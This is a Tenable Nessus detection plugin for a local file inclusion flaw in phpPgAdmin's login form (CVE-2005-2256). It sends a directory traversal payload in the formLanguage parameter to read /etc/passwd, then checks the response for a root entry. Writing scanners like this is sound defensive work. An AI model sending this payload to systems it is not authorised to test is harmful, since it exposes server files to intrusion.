#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18637);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-2256");
  script_bugtraq_id(14142);
  script_xref(name:"OSVDB", value:"17758");

  script_name(english:"phpPgAdmin index.php formLanguage Parameter Local File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpPgAdmin, a web-based administration tool
for PostgreSQL. 

The installed version of phpPgAdmin fails to filter directory
traversal sequences from user-input supplied to the 'formLanguage'
parameter of the login form.  An attacker can exploit this issue to
read files outside the application's document directory and to include
arbitrary PHP files from the remote host, subject to the privileges of
the web server userid." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/dailydave/2005-q3/0010.html" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?release_id=342261" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpPgAdmin 3.5.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_summary(english:"Checks for formLanguage parameter directory traversal vulnerability in phpPgAdmin");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Check whether the login script exists.
  r = http_send_recv3(method:"GET",item:string(dir, "/login.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ('/login.php" method="post" name="login_form">' >< res) {
    # Try to exploit the flaw to read /etc/passwd.
    postdata = string(
      "formUsername=", SCRIPT_NAME, "&",
      "formPassword=nessus&",
      "formServer=0&",
      "formLanguage=../../../../../../../../../../etc/passwd%00&",
      "submitLogin=Login"
    );
    r = http_send_recv3(method:"POST ", item: dir + "/login.php", version: 11, port: port,
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if there's an entry for root.
    if (egrep(string:res, pattern:"root:.*:0:[01]:")) {
      security_warning(port);
      exit(0);
    }
  }
}
